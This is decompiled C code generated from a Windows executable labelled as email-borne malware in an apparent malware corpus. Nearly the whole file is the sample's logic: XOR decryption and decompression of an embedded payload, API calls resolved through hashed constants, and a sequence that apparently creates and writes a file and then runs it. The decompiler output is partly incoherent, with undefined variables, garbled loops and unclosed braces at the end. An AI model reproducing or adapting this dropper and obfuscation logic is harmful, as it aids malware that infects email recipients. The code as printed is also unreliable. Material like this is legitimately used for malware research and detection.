// subject.c
// Generated on TIMESTAMP by decompiling malware_via_email/malware_0116/ia32_pe/subject.exe
// using Decompiler version VERSION

#include "subject.h"

void fn00401020(word32 ebp, selector fs)
{
	fn00403640(0x0000892C, dwLoc14);
	word32 ebp_1048 = fp - 0x00000004;
	if (fn00403590(fs) != 0x00000000)
	{
		word32 eax_67 = Mem0[0x0040603C:word32];
		Mem72[fp + 0xFFFFFE98:byte] = 0x00;
		Mem74[fp + 0xFFFF770C:word32] = eax_67;
		word32 ecx_69 = 0x00401C00;
		word32 ebx_103 = fp + 0xFFFFC59C;
		word32 edi_76 = Mem74[fp + 0xFFFF770C:word32];
		do
		{
			Mem89[ebx_103 + 0x00000000:word32] = (Mem74[0x0040603C:word32] | 0xA605EF2A) ^ Mem74[ecx_69 + 0x00000000:word32];
			ecx_69 = ecx_69 + 0x33333337;
			ebx_103 = ebx_103 - edi_76 * 0x00000005 + 0x00000004;
		} while (ecx_69 <=u 0xFFBFFB6F);
		word32 esi_95 = Mem89[fp + 0xFFFF770C:word32];
		Mem102[fp + 0xFFFF76F8:word32] = (esi_95 + 0x00000001) * 0x00000004;
		word32 ecx_104 = 0x00000000;
		do
		{
			Mem115[ebx_103 + 0x00000000:word32] = (word32) (Mem102[fp + 0xFFFF770C:word32] >=u 0xA605EF2B) - 0x59FA10D6 ^ Mem102[ecx_104 + 0x00404060:word32];
			ebx_103 = ebx_103 + Mem115[fp + 0xFFFF76F8:word32];
			ecx_104 = ecx_104 + SEQ(0x0000000000000004 % (esi_95 + 0x00000001), 0x00000004) /u (esi_95 + 0x00000001);
		} while (ecx_104 <=u 0x00001A57);
		word32 ebx_129 = Mem115[fp + 0xFFFF770C:word32];
		Mem131[fp + 0xFFFF772C:word32] = fp + 0xFFFFC59C;
		Mem136[fp + 0xFFFF76EC:word32] = 0x33333337;
		Mem138[fp + 0xFFFF76F4:word32] = fp + 0xFFFFF764;
		word32 edx_139 = 0x00000000;
		byte dl_141 = 0x00;
		word16 dx_1418 = 0x0000;
		do
		{
			Mem157[Mem138[fp + 0xFFFF76F4:word32]:word16] = dx_1418;
			if ((dl_141 & 0x01) != 0x00)
			{
				word32 ecx_1431 = Mem162[fp + 0xFFFF772C:word32];
				word32 eax_1435 = (word32) Mem162[ecx_1431 + 0x00000000:byte];
				Mem1437[fp + 0xFFFF772C:word32] = ecx_1431 + 0x00000001;
				Mem1441[esi_158 + 0x00000004:byte] = (byte) (eax_1435 & 0x0000000F);
				Mem1443[fp + 0xFFFF76F4:word32] = Mem1441[fp + 0xFFFF76F4:word32] + 0x00000006;
				edx_139 = edx_139 + 0x00000001;
				dl_141 = (byte) edx_139;
				dx_1418 = (word16) edx_139;
				if (edx_139 != (ebx_129 | 0x00000108))
					continue;
			}
			Mem1410[Mem162[fp + 0xFFFF76F4:word32] + 0x00000004:byte] = (byte) ((word32) Mem162[Mem162[fp + 0xFFFF772C:word32]:byte] >> (byte) ((word32) Mem162[fp + 0xFFFF76EC:byte]));
			Mem1412[fp + 0xFFFF76F4:word32] = Mem1410[fp + 0xFFFF76F4:word32] + 0x00000006;
			word32 edx_1403 = edx_139 + 0x00000001;
		} while (edx_1403 + 0x00000001 != (ebx_129 | 0x00000108));
l00401183:
		Mem171[fp - 0x00000022:byte] = 0x00;
		Mem172[fp - 0x00000022:byte] = 0x00;
		word32 eax_173 = 0x00000002;
		do
		{
			Mem178[eax_173 - 0x0000001F + (fp - 0x00000004):byte] = 0x00;
			eax_173 = eax_173 + 0x00000001;
		} while (eax_173 != 0x00000011);
		word32 ebx_185 = Mem178[fp + 0xFFFF770C:word32];
		word32 ecx_186 = 0xFFFFF76C;
		do
		{
			byte al_199 = (byte) (word32) Mem178[ecx_186 + 0x00000000 + (fp - 0x00000004):byte];
			if (al_199 > 0x00)
			{
				word32 edx_1396 = SEQ(0x00000000, (int32) al_199) % (ebx_185 - 0x00000001);
				Mem1400[fp - 0x00000022 + edx_1396:byte] = Mem178[fp - 0x00000022 + edx_1396:byte] + 0x01;
			}
			ecx_186 = ecx_186 + 0x00000006;
		} while (ecx_186 != 0x00000EC4);
		word32 ebx_211 = 0x00000000;
		word32 edx_214 = 0x00000001;
		do
		{
			ebx_211 = ebx_211 + (int32) Mem178[(edx_214 - 0x0000001F) + (fp - 0x00000004):byte] << (byte) ((0x00000000 - (Mem178[fp + 0xFFFF770C:word32] <u 0x00000001)) + 0x00000002);
			(fp - 0x00000064)[edx_214 * 0x00000004] = ebx_211 + Mem178[fp + 0xFFFF770C:word32];
			edx_214 = edx_214 + 0x00000001;
		} while (edx_214 != 0x00000010);
		word32 ecx_238 = fp + 0xFFFFF768;
		do
		{
			word32 edx_243 = (int32) Mem231[ecx_238 + 0x00000000:byte];
			word32 eax_244 = (fp - 0x00000064)[edx_243 * 0x00000004];
			Mem246[ecx_238 - 0x00000002:word16] = (word16) eax_244;
			(fp - 0x00000064)[edx_243 * 0x00000004] = eax_244 + 0x00000001;
			ecx_238 = ecx_238 + 0x00000006;
		} while (ecx_238 != fp + 0xFFFFFD98);
		word32 ebx_285;
		Mem268[fp + 0xFFFF7754:word32] = SEQ(0x0000000000000108 % (esi_95 + 0x00000001), 0x00000108) /u (esi_95 + 0x00000001) - 0x00000001;
		byte cl_261 = 0x00;
		word32 edx_263 = 0x00000000;
		if (0x00000000 <u Mem268[fp + 0xFFFF7754:word32])
		{
l00401253:
			word32 edi_279 = fp - 0x00000010 + (edx_263 * 0x00000003) * 0x00000002;
			Mem282[fp + 0xFFFF7720:word32] = edi_279 + 0xFFFFF774;
			Mem286[fp + 0xFFFF7725:byte] = (byte) (word32) Mem282[edi_279 + 0xFFFFF778:byte];
			ebx_285 = edx_263 + 0x00000001;
			byte dl_289 = (byte) (word32) Mem286[fp + 0xFFFF7725:byte];
			word32 eax_290 = fp - 0x00000010 + (ebx_285 * 0x00000003) * 0x00000002;
			Mem296[fp + 0xFFFF771C:word32] = eax_290;
			if (dl_289 <= Mem296[eax_290 - 0x00000888:byte])
			{
l00401249:
				edx_263 = ebx_285;
l0040124B:
				if (edx_263 >=u Mem268[fp + 0xFFFF7754:word32])
				{
					if (cl_261 != 0x00)
					{
						cl_261 = 0x00;
						ebx_285 = 0x00000000;
						goto l00401249;
					}
					word32 edx_388 = SLICE(Mem268[fp + 0xFFFF770C:word32] *u 0xFF00FF01, word32, 32);
					Mem392[fp + 0xFFFF7734:word32] = -Mem268[fp + 0xFFFF770C:word32];
					Mem393[fp + 0xFFFF76FC:word32] = edx_388;
					word32 edi_385 = 0x00000080;
					while (true)
					{
						word32 ecx_407 = Mem393[fp + 0xFFFF770C:word32];
						word32 eax_410 = Mem393[fp + 0xFFFF770C:word32];
						Mem413[fp + 0xFFFF775C:word32] = 0x00000000;
						Mem414[fp + 0xFFFF7730:word32] = 0xFFFFFFFF;
						Mem418[fp + 0xFFFF7750:word32] = ecx_407 | 0x00000001;
						Mem419[fp + 0xFFFF7700:word32] = eax_410 - 0x00000001;
						word32 ebx_1387 = edi_385;
						word32 esi_1301 = 0x00000000;
						word32 edi_411 = 0x00000000;
						do
						{
							word32 edx_430 = Mem419[fp + 0xFFFF7750:word32];
							word32 ecx_1388 = 0x00000000;
							do
							{
								ecx_1388 = ecx_1388 * 0x00000002;
								if (((word32) Mem419[Mem419[fp + 0xFFFF772C:word32]:byte] & ebx_1387) != 0x00000000)
									ecx_1388 = ecx_1388 | 0x00000001;
								ebx_1387 = ebx_1387 >> 0x00000001;
								if (ebx_1387 == 0x00000000)
								{
									Mem1385[fp + 0xFFFF772C:word32] = Mem419[fp + 0xFFFF772C:word32] + 0x00000001;
									ebx_1387 = 0x00000080;
								}
								edx_430 = edx_430 - 0x00000001;
							} while (edx_430 != 0x00000000);
							word32 v27_470 = Mem419[fp + 0xFFFF775C:word32] << 0x00000001;
							Mem471[fp + 0xFFFF775C:word32] = v27_470;
							word32 v28_475 = Mem471[fp + 0xFFFF775C:word32] | ecx_1388;
							Mem476[fp + 0xFFFF775C:word32] = v28_475;
							word32 eax_478 = esi_1301 * 0x00000003 * 0x00000002;
							edi_411 = edi_411 + 0x00000001;
							word32 edx_1374 = (int32) Mem476[fp + 0xFFFFF768 + eax_478:byte];
							if (edi_411 > edx_1374)
							{
								word32 eax_1368 = fp + 0xFFFFF764 + eax_478 + 0x0000000A;
								do
								{
									edx_1374 = (int32) Mem476[eax_1368 + 0x00000000:byte];
									esi_1301 = esi_1301 + 0x00000001;
									eax_1368 = eax_1368 + 0x00000006;
								} while (edi_411 > edx_1374);
							}
							if (edi_411 != edx_1374)
								if (Mem476[fp + 0xFFFF7730:word32] < 0x00000000)
									continue;
							word32 eax_1315 = esi_1301 * 0x00000003;
							word32 edx_1321 = fp + 0xFFFFF764 + eax_1315 * 0x00000002;
							if ((int32) (fp + 0xFFFFF766)[eax_1315 * 0x00000002] == Mem476[fp + 0xFFFF775C:word32])
								goto l004017C5;
							do
							{
								word32 esi_1352 = esi_1301 + 0x00000001;
								if ((int32) Mem476[edx_1446 + 0x0000000A:byte] != edi_411)
									;
								edx_1321 = edx_1446 + 0x00000006;
								word32 edx_1446 = edx_1321;
							} while ((int32) Mem476[edx_1446 + 0x00000008:word16] == Mem476[fp + 0xFFFF775C:word32]);
l004017C5:
							word32 eax_1330 = (int32) (fp + 0xFFFFF764)[esi_1301 * 0x00000003 * 0x0002];
							Mem1334[fp + 0xFFFF7730:word32] = 0xFFFFFFFF;
							if (eax_1330 == 0xFFFFFFFF)
								continue;
							Mem1342[fp + 0xFFFF7730:word32] = SEQ(0x00000000, eax_1330) % Mem1334[fp + 0xFFFF7700:word32];
						} while (Mem1342[fp + 0xFFFF7730:word32] < 0x00000000);
l0040178B:
						if (Mem476[fp + 0xFFFF7730:word32] >=u edx_516)
						{
							if (Mem476[fp + 0xFFFF7730:word32] != (Mem476[fp + 0xFFFF76FC:word32] >>u 0x00000008) + 0x00000100)
							{
								byte cl_577;
								word32 esi_570;
								Mem546[fp + 0xFFFF7730:word32] = Mem476[fp + 0xFFFF7730:word32] - (edx_516 + (ecx_511 + 0x00000001));
								word32 esi_547 = Mem546[fp + 0xFFFF7730:word32];
								word32 esi_549 = (int32) (esi_547 * 0x00000003 + 0x00405AC0)[esi_547 * 0x00000003];
								word16 ax_561 = (word16) (word32) (esi_547 * 0x00000003 + 0x00405AC2)[esi_547 * 0x00000003];
								Mem567[fp + 0xFFFF7726:word16] = (word16) (word32) (esi_547 * 0x00000003 + 0x00405AC4)[esi_547 * 0x00000003];
								word32 eax_554 = SEQ(SEQ(0x00000000, esi_549) % (ecx_511 + 0x00000001), esi_549) /u (ecx_511 + 0x00000001);
								if (eax_554 != 0x00000000)
								{
									word32 esi_803 = Mem567[fp + 0xFFFF772C:word32];
									Mem805[fp + 0xFFFF7740:word32] = eax_554;
									cl_577 = (byte) (word32) Mem805[esi_803 + 0x00000000:byte];
									Mem812[fp + 0xFFFF7713:byte] = cl_577;
									edi_385 = ebx_1387 >> 0x00000001;
									esi_570 = (word32) cl_577;
								}
								else
								{
									word32 edx_814 = (int32) ax_561;
									word32 eax_818 = (edx_814 | 0x00000001) *s Mem567[fp + 0xFFFF770C:word32];
									cl_577 = (byte) (word32) Mem567[Mem567[fp + 0xFFFF772C:word32]:byte];
									Mem822[fp + 0xFFFF7744:word32] = 0x00000000;
									Mem829[fp + 0xFFFF7713:byte] = cl_577;
									word32 eax_825 = edx_814 - eax_818;
									do
									{
										Mem844[fp + 0xFFFF7744:word32] = Mem829[fp + 0xFFFF7744:word32] << 0x00000001;
										if ((esi_570 & ebx_1387) != 0x00000000)
										{
											Mem921[fp + 0xFFFF7744:word32] = Mem849[fp + 0xFFFF7744:word32] | 0x00000001;
											Mem924[fp + 0xFFFF7744:word32] = Mem921[fp + 0xFFFF7744:word32] | 0x00000001;
										}
										ebx_1387 = ebx_1387 >> 0x00000001;
										if (ebx_1387 != 0x00000000)
										{
											edi_385 = ebx_1387 >> 0x00000001;
											eax_825 = eax_825 - 0x00000001;
											if (eax_825 != 0x00000000)
												continue;
										}
										Mem895[fp + 0xFFFF772C:word32] = Mem849[fp + 0xFFFF772C:word32] + 0x00000001;
										cl_577 = (byte) (word32) Mem895[Mem895[fp + 0xFFFF772C:word32]:byte];
										Mem909[fp + 0xFFFF7713:byte] = cl_577;
										eax_825 = eax_825 - 0x00000001;
										ebx_1387 = 0x00000080;
										edi_385 = 0x00000040;
										esi_570 = (word32) cl_577;
									} while (eax_825 != 0x00000000);
l00401A8B:
									word32 eax_868 = (int32) Mem849[fp + 0xFFFF7726:word16];
									Mem870[fp + 0xFFFF76F0:word32] = eax_868;
									Mem872[fp + 0xFFFF76E8:word32] = eax_868 | 0x00000001;
									word32 eax_873 = Mem872[fp + 0xFFFF770C:word32];
									word32 edx_879 = Mem872[fp + 0xFFFF76F0:word32] + SEQ(SEQ(0x00000000, eax_873) % Mem872[fp + 0xFFFF76E8:word32], eax_873) /u Mem872[fp + 0xFFFF76E8:word32];
									word32 eax_880 = Mem872[fp + 0xFFFF770C:word32];
									Mem881[fp + 0xFFFF7758:word32] = edx_879;
									Mem883[fp + 0xFFFF76F0:word32] = edx_879 | 0x00000001;
									word32 eax_888 = SEQ(SEQ(0x00000000, eax_880) % Mem883[fp + 0xFFFF76F0:word32], eax_880) /u Mem883[fp + 0xFFFF76F0:word32];
									Mem889[fp + 0xFFFF76E8:word32] = eax_888;
									Mem893[fp + 0xFFFF7740:word32] = eax_888 + Mem889[fp + 0xFFFF7758:word32] + Mem889[fp + 0xFFFF7744:word32];
								}
								word32 eax_588;
								if (edi_385 != 0x00000000)
								{
									Mem783[fp + 0xFFFF774C:word32] = edi_385 >> 0x00000001;
									eax_588 = esi_570;
								}
								else
								{
									Mem789[fp + 0xFFFF772C:word32] = Mem567[fp + 0xFFFF772C:word32] + 0x00000001;
									cl_577 = (byte) (word32) Mem789[Mem789[fp + 0xFFFF772C:word32]:byte];
									Mem797[fp + 0xFFFF774C:word32] = 0x00000040;
									Mem802[fp + 0xFFFF7713:byte] = cl_577;
									edi_385 = 0x00000080;
									eax_588 = (word32) cl_577;
								}
								Mem598[fp + 0xFFFF773C:word32] = 0x00000007;
								if ((esi_570 & ebx_1387) != 0x00000000)
								{
									if (Mem598[fp + 0xFFFF774C:word32] == 0x00000000)
									{
										Mem773[fp + 0xFFFF772C:word32] = Mem598[fp + 0xFFFF772C:word32] + 0x00000001;
										word32 ecx_775 = Mem773[fp + 0xFFFF772C:word32];
										Mem776[fp + 0xFFFF774C:word32] = 0x00000080;
										Mem779[fp + 0xFFFF7713:byte] = (byte) (word32) Mem776[ecx_775 + 0x00000000:byte];
									}
									cl_577 = (byte) (word32) Mem598[fp + 0xFFFF7713:byte];
									edi_385 = Mem598[fp + 0xFFFF774C:word32];
									Mem771[fp + 0xFFFF773C:word32] = (word32) ((eax_588 & edi_385) != 0x00000000) + (Mem598[fp + 0xFFFF770C:word32] | 0x00000008);
								}
								word32 esi_607 = Mem598[fp + 0xFFFF773C:word32];
								word32 edx_608 = 0xFFFFFFFF;
								word32 ebx_613 = (int32) (esi_607 * 0x00000003 + 0x00405AC2)[esi_607 * 0x00000003];
								if (ebx_613 != 0xFFFFFFFF)
									edx_608 = SEQ(0x00000000, ebx_613) % (Mem598[fp + 0xFFFF770C:word32] - 0x00000001);
								word32 esi_622 = 0x00000000;
								while (true)
								{
									esi_622 = esi_622 * 0x00000002;
									if (((word32) cl_577 & edi_385) != 0x00000000)
										esi_622 = esi_622 | 0x00000001;
									edi_385 = edi_385 >> 0x00000001;
									if (edi_385 == 0x00000000)
									{
										Mem734[fp + 0xFFFF772C:word32] = Mem598[fp + 0xFFFF772C:word32] + 0x00000001;
										edi_385 = 0x00000080;
									}
									edx_608 = edx_608 - 0x00000001;
									if (edx_608 == 0x00000000)
									{
										word32 edx_656 = Mem598[fp + 0xFFFF773C:word32];
										word32 edx_662 = (int32) (edx_656 * 0x00000003 + 0x00405AC4)[edx_656 * 0x00000003];
										if (Mem598[fp + 0xFFFF770C:word32] != 0x00000000)
											edx_662 = edx_662 * 0x00000002;
										if (Mem598[fp + 0xFFFF7740:word32] > 0x00000000)
										{
											word32 ebx_693 = fp + 0xFFFF7764 + Mem598[fp + 0xFFFF7734:word32];
											Mem699[fp + 0xFFFF76F4:word32] = ebx_693 - ((esi_622 + Mem598[fp + 0xFFFF770C:word32]) + edx_662);
											word32 esi_700 = 0x00000000;
											do
											{
												word32 edx_705 = Mem699[fp + 0xFFFF76F4:word32];
												word32 eax_707 = (word32) Mem699[edx_705 + 0x00000000:byte];
												Mem709[fp + 0xFFFF76F4:word32] = edx_705 + 0x00000001;
												word32 edx_710 = Mem709[0x0040603C:word32];
												Mem719[ebx_693 + 0x00000000:byte] = (byte) (SEQ(SEQ(0x00000000, eax_707) % (edx_710 + 0x00000001), eax_707) /u (edx_710 + 0x00000001));
												esi_700 = esi_700 + 0x00000001;
												ebx_693 = ebx_693 + 0x00000001;
											} while (esi_700 != Mem719[fp + 0xFFFF7740:word32]);
										}
										word32 esi_683 = Mem598[fp + 0xFFFF7740:word32];
										Mem685[fp + 0xFFFF7734:word32] = Mem598[fp + 0xFFFF7734:word32] + esi_683;
										Mem687[fp + 0xFFFF7740:word32] = esi_683 | 0x00000001;
										Mem690[fp + 0xFFFF7734:word32] = Mem687[fp + 0xFFFF7734:word32] - (esi_683 | 0x00000001) *s Mem687[0x0040603C:word32];
										continue;
									}
									cl_577 = (byte) (word32) Mem598[Mem598[fp + 0xFFFF772C:word32]:byte];
								}
							}
							if (Mem476[fp + 0xFFFF7734:word32] > 0x00000000)
							{
								word32 eax_1166 = Mem476[fp + 0xFFFF770C:word32];
								Mem1169[fp + 0xFFFF7748:word32] = 0x00000040;
								word32 edx_1170 = Mem1169[fp + 0xFFFF770C:word32];
								Mem1172[fp + 0xFFFF7714:word32] = ecx_511 + 0x00000001 + (ecx_511 + 0x00000001) * 0x00000002 << 0x00000004;
								Mem1180[fp + 0xFFFF7748:word32] = Mem1172[fp + 0xFFFF7748:word32] - ((eax_1166 << 0x00000006) + Mem1172[fp + 0xFFFF770C:word32]);
								word32 eax_1181 = Mem1180[fp + 0xFFFF770C:word32];
								Mem1182[fp + 0xFFFF7704:word32] = edx_1170 - 0x00000001;
								Mem1186[fp + 0xFFFF7708:word32] = eax_1181 | 0x00000010;
								word32 esi_1168 = 0xFFFFFFFF;
								word32 ebx_1173 = 0x00000000;
								word32 edi_1174 = 0x00000000;
								do
								{
									if (Mem1186[fp + 0xFFFF770C:word32] != 0x00000000)
									{
										word32 eax_1290 = SEQ(SEQ(0x00000000, eax_1199) % Mem1186[fp + 0xFFFF770C:word32], eax_1199) /u Mem1186[fp + 0xFFFF770C:word32];
										eax_1199 = SEQ(SEQ(0x00000000, eax_1290) % Mem1186[fp + 0xFFFF770C:word32], eax_1290) /u Mem1186[fp + 0xFFFF770C:word32];
										al_1201 = (byte) eax_1199;
									}
									word32 edx_1211 = eax_1199;
									if (esi_1168 <= 0x00000043)
										if (edi_1174 >=u Mem1186[fp + 0xFFFF7708:word32])
										{
											esi_1168 = esi_1168 + 0x00000001;
											if (esi_1168 <= 0x0000002F)
											{
												word32 eax_1252 = (int32) Mem1186[esi_1168 + 0x00404010:byte];
												edx_1211 = 0xFFFFFFFF;
												if (eax_1252 != 0xFFFFFFFF)
													edx_1211 = SEQ(0x00000000, eax_1252) % Mem1186[fp + 0xFFFF7704:word32];
											}
											else if (esi_1168 <= 0x0000003F)
												edx_1211 = (int32) Mem1186[esi_1168 - Mem1186[fp + 0xFFFF7714:word32] + 0x00404040:byte];
											else
												edx_1211 = (int32) Mem1186[esi_1168 - Mem1186[fp + 0xFFFF7748:word32] + 0x00406000:byte];
										}
										else if (Mem1186[edi_1174 + 0x00404000:byte] != al_1201)
										{
											edi_1174 = Mem1186[fp + 0xFFFF770C:word32];
											edx_1211 = eax_1199;
										}
										else
										{
											edi_1174 = edi_1174 + 0x00000001;
											edx_1211 = eax_1199;
										}
									Mem1228[ebx_1173 + 0xFFFF7768 + (fp - 0x00000004):byte] = (byte) (edx_1211 *s (ecx_511 + 0x00000001));
									ebx_1173 = ebx_1173 + 0x00000001;
								} while (ebx_1173 == Mem1228[fp + 0xFFFF7734:word32]);
							}
							word32 ecx_931 = Mem476[fp + 0xFFFF7728:word32];
							Mem933[fp - 0x00000010:word32] = 0xFB7C55AC;
							Mem934[0x00406028:word32] = 0x00000000;
							Mem935[fp - 0x0000000C:word32] = ecx_931;
							word32 eax_938 = fn00403390(dwArg04, dwArg08);
							word32 esi_939 = Mem935[fp + 0xFFFF7728:word32];
							Mem940[fp - 0x00000010:word32] = 0xCC1D2AE0;
							Mem941[fp - 0x0000000C:word32] = esi_939;
							Mem942[0x00406028:word32] = eax_938;
							word32 eax_943 = fn00403390(dwArg04, dwArg08);
							word32 edx_944 = Mem942[0x0040603C:word32];
							Mem945[fp - 0x0000000C:word32] = fp + 0xFFFFFD94;
							Mem946[fp - 0x00000010:word32] = 0x00000104;
							Mem948[0x00406014:word32] = eax_943;
							word32 eax_949 = eax_943 *s (edx_944 + 0x00000001);
							eax_949();
							Mem970[fp - 0x00000014:word32] = esi_939;
							Mem971[fp - 0x00000018:word32] = 0x94755F89;
							word32 eax_973 = fn00403390(dwArg00, dwArg04);
							word32 edx_974 = Mem971[0x0040603C:word32];
							Mem975[fp - 0x00000018:word32] = fp + 0xFFFFFD94;
							Mem976[fp - 0x00000010:word32] = 0x00000000;
							Mem977[fp - 0x00000014:word32] = 0x00000000;
							Mem979[0x00406010:word32] = eax_973;
							Mem983[fp - 0x0000000C:word32] = fp + 0xFFFFFE98;
							word32 eax_980 = eax_973 *s (edx_974 + 0x00000001);
							eax_980();
							Mem986[fp - 0x00000024:word32] = esi_939;
							Mem988[fp - 0x00000028:word32] = 0x811324F8;
							word32 eax_989 = fn00403390(dwArg00, dwArg04);
							word32 edx_990 = Mem988[0x0040603C:word32];
							Mem991[fp - 0x00000010:word32] = 0x00000000;
							Mem992[fp - 0x00000014:word32] = 0x00000000;
							Mem993[fp - 0x00000018:word32] = 0x00000002;
							Mem995[fp - 0x0000001C:word32] = 0x00000000;
							Mem996[0x00406004:word32] = eax_989;
							Mem999[fp - 0x00000020:word32] = 0x00000001;
							Mem1000[fp - 0x00000024:word32] = 0xC0000000;
							Mem1001[fp - 0x00000028:word32] = fp + 0xFFFFFE98;
							word32 eax_997 = eax_989 *s (edx_990 + 0x00000001);
							eax_997();
							if (eax_997 != 0xFFFFFFFF)
							{
								word32 eax_1007 = Mem1001[fp + 0xFFFF7728:word32];
								Mem1008[fp - 0x00000044:word32] = 0x8E7615EF;
								Mem1009[fp - 0x00000040:word32] = eax_1007;
								word32 eax_1010 = fn00403390(dwArg00, dwArg04);
								word32 edx_1011 = Mem1009[0x0040603C:word32];
								Mem1012[fp - 0x00000030:word32] = 0x00000000;
								Mem1013[fp - 0x00000038:word32] = 0x00000000;
								Mem1014[fp - 0x0000003C:word32] = 0x00000004;
								Mem1016[fp - 0x00000040:word32] = 0x00000000;
								Mem1017[0x0040602C:word32] = eax_1010;
								word32 edx_1019 = Mem1017[fp + 0xFFFF7734:word32];
								Mem1020[fp - 0x00000044:word32] = eax_997;
								Mem1023[fp - 0x00000034:word32] = edx_1019 + 0x00000001;
								word32 eax_1018 = eax_1010 *s (edx_1011 + 0x00000001);
								eax_1018();
								Mem1027[fp - 0x00000058:word32] = Mem1023[fp + 0xFFFF7728:word32];
								Mem1028[fp - 0x0000005C:word32] = 0xFC1F1484;
								Mem1029[fp + 0xFFFF7738:word32] = eax_1018;
								word32 eax_1030 = fn00403390(dwArg00, dwArg04);
								word32 edx_1031 = Mem1029[0x0040603C:word32];
								word32 ecx_1032 = Mem1029[fp + 0xFFFF7738:word32];
								Mem1033[fp - 0x0000004C:word32] = 0x00000000;
								Mem1034[fp - 0x00000050:word32] = 0x00000000;
								Mem1036[fp - 0x00000054:word32] = 0x00000000;
								Mem1037[0x00406030:word32] = eax_1030;
								Mem1040[fp - 0x00000058:word32] = 0x00000002;
								Mem1041[fp - 0x0000005C:word32] = ecx_1032;
								word32 eax_1038 = eax_1030 *s (edx_1031 + 0x00000001);
								eax_1038();
								Mem1042[fp - 0x00000011:byte] = 0x00;
								word32 esi_1043 = eax_1038;
								word32 esp_1045 = fp - 0x00000070 + 0x00000004;
								if (Mem1042[fp + 0xFFFF7734:word32] > 0x00000000)
								{
									word32 ebx_1144 = 0xFFFF7768;
									do
									{
										byte al_1152 = (byte) (word32) Mem1042[ebx_1144 + 0x00000000 + ebp_1048:byte];
										word32 edx_1153 = Mem1042[0x0040603C:word32];
										Mem1154[ebp_1048 - 0x0000000E:byte] = al_1152;
										Mem1157[esp_1045 + 0x00000000:word32] = ebp_1048 - 0x0000000E;
										word32 eax_1158 = ebx_1144 + esi_1043;
										word32 edx_1160 = (edx_1153 + 0x00000001) *s Mem1157[0x00406028:word32];
										Mem1162[esp_1045 + 0x00000000:word32] = eax_1158;
										ebx_1144 = ebx_1144 + 0x00000001;
										edx_1160();
										esp_1045 = esp_1045 - 0x00000008;
									} while (ebx_1144 != Mem1162[ebp_1048 + 0xFFFF7738:word32]);
								}
								word32 edx_1051 = Mem1042[ebp_1048 + 0xFFFF772C:word32];
								Mem1052[esp_1045 + 0x00000000:word32] = 0xCB764D98;
								Mem1053[esp_1045 + 0x00000004:word32] = edx_1051;
								word32 eax_1054 = fn00403390(dwArg00, dwArg04);
								word32 edx_1055 = Mem1053[0x0040603C:word32];
								Mem1056[esp_1045 + 0x00000000:word32] = esi_1043;
								Mem1058[0x00406034:word32] = eax_1054;
								word32 eax_1059 = eax_1054 *s (edx_1055 + 0x00000001);
								eax_1059();
								word32 ecx_1061 = Mem1058[ebp_1048 + 0xFFFF772C:word32];
								word32 esp_1062 = esp_1045 - 0x00000004;
								Mem1064[esp_1062 + 0x00000004:word32] = ecx_1061;
								Mem1065[esp_1062 + 0x00000000:word32] = 0x941A1EE1;
								word32 eax_1066 = fn00403390(dwArg00, dwArg04);
								word32 edx_1067 = Mem1065[0x0040603C:word32];
								Mem1070[esp_1062 + 0x00000000:word32] = Mem1065[ebp_1048 + 0xFFFF773C:word32];
								Mem1072[0x00406008:word32] = eax_1066;
								word32 esi_1071 = ebp_1048 + 0xFFFFFD98;
								word32 eax_1073 = eax_1066 *s (edx_1067 + 0x00000001);
								eax_1073();
								word32 eax_1077 = (Mem1072[0x0040603C:word32] + 0x00000001) *s Mem1072[0x00406008:word32];
								Mem1080[esp_1062 - 0x00000004:word32] = eax_997;
								eax_1077();
								word32 edi_1081 = Mem1080[ebp_1048 + 0xFFFF772C:word32];
								Mem1084[esp_1062 - 0x00000004:word32] = edi_1081;
								Mem1085[esp_1062 - 0x00000008:word32] = 0xDE0B22C2;
								word32 eax_1086 = fn00403390(dwArg00, dwArg04);
								word32 edx_1087 = Mem1085[0x0040603C:word32];
								Mem1089[0x0040601C:word32] = eax_1086;
								word32 edx_1092 = ebp_1048 + 0xFFFFFE9C;
								Mem1093[esp_1062 - 0x00000008:word32] = edx_1092;
								word32 eax_1090 = eax_1086 *s (edx_1087 + 0x00000001);
								eax_1090();
								Mem1097[esp_1062 - 0x00000008:word32] = edi_1081;
								Mem1098[esp_1062 - 0x0000000C:word32] = 0xA9781EEE;
								word32 eax_1099 = fn00403390(dwArg00, dwArg04);
								word32 edx_1100 = Mem1098[0x0040603C:word32];
								word32 ecx_1101 = ebp_1048 + 0xFFFFFD98;
								Mem1102[esp_1062 - 0x00000008:word32] = ecx_1101;
								Mem1103[esp_1062 - 0x00000004:word32] = 0x00000104;
								Mem1104[esp_1062 - 0x0000000C:word32] = 0x00000000;
								Mem1106[0x00406018:word32] = eax_1099;
								word32 eax_1107 = eax_1099 *s (edx_1100 + 0x00000001);
								eax_1107();
								Mem1111[esp_1062 - 0x00000014:word32] = eax_1090;
								Mem1112[esp_1062 - 0x00000018:word32] = 0xFC1344B9;
								word32 eax_1113 = fn00403390(dwArg00, dwArg04);
								word32 edx_1114 = Mem1112[0x0040603C:word32];
								Mem1115[esp_1062 - 0x00000018:word32] = esi_1071;
								Mem1117[0x00406038:word32] = eax_1113;
								word32 eax_1118 = eax_1113 *s (edx_1114 + 0x00000001);
								eax_1118();
								Mem1122[esp_1062 - 0x00000018:word32] = edi_1081;
								Mem1123[esp_1062 - 0x0000001C:word32] = 0x9E0F3FC8;
								word32 eax_1124 = fn00403390(dwArg00, dwArg04);
								word32 edx_1125 = Mem1123[0x0040603C:word32];
								Mem1126[esp_1062 - 0x0000001C:word32] = eax_1090;
								Mem1128[0x00406020:word32] = eax_1124;
								word32 eax_1129 = eax_1124 *s (edx_1125 + 0x00000001);
								eax_1129();
								Mem1133[esp_1062 - 0x0000001C:word32] = edi_1081;
								Mem1134[esp_1062 - 0x00000020:word32] = 0x9E042FD3;
								word32 eax_1135 = fn00403390(dwArg00, dwArg04);
								word32 edx_1136 = Mem1134[0x0040603C:word32];
								Mem1137[esp_1062 - 0x00000020:word32] = 0x00000000;
								Mem1139[0x00406024:word32] = eax_1135;
								word32 eax_1140 = eax_1135 *s (edx_1136 + 0x00000001);
								eax_1140();
							}
						}
						word32 edx_522 = Mem476[fp + 0xFFFF7734:word32];
						Mem525[fp + 0xFFFF7764 + edx_522:byte] = (byte) (word32) Mem476[fp + 0xFFFF7730:byte];
						Mem527[fp + 0xFFFF7734:word32] = edx_522 + 0x00000001;
						word32 edx_528 = Mem527[fp + 0xFFFF7734:word32];
						Mem533[fp + 0xFFFF7764 + edx_528:byte] = (byte) (word32) Mem527[fp + 0xFFFF7730:byte];
						Mem536[fp + 0xFFFF7734:word32] = edx_528 + 0x00000001;
						edi_385 = ebx_1387;
					}
				}
			}
